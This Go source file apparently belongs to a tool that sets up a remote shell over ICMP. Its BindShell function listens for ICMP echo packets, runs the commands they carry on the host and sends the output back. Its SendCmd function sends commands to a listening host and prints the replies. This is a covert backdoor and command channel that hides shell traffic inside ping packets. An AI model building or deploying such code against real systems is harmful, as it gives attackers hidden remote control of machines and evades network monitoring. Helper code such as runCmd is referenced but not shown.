package main

import (
	"fmt"
	"net"

	"golang.org/x/net/ipv4"
)

type CLI struct {
	icmp ICMPCat
}

func NewCLI() (*CLI, error) {
	icmp, err := NewICMPCat()
	if err != nil {
		return nil, err
	}
	return &CLI{icmp: icmp}, nil
}

// Open a shell that executes remote requests
func (cli *CLI) BindShell() {
	cli.icmp.OnReceive(func(peer *net.IPAddr, res []byte) {
		msg := parseMsg(res)
		if msg.kind == msgCmdType {
			fmt.Println(msg.value)
			msg := newMsgResType(runCmd(msg.value))
			cli.icmp.Send(ipv4.ICMPTypeEcho, msg.bytes, peer.String())
		}
	})
	cli.icmp.Listen()
}

// Execute a command on the remote host
func (cli *CLI) SendCmd(cmd, host string) {
	cli.icmp.Send(ipv4.ICMPTypeEcho, newMsgCmdType(cmd).bytes, host)
	cli.icmp.OnReceive(func(peer *net.IPAddr, res []byte) {
		msg := parseMsg(res)
		if msg.kind == msgResType {
			fmt.Printf("%s", msg.value)
		}
	})
	cli.icmp.Listen()
}
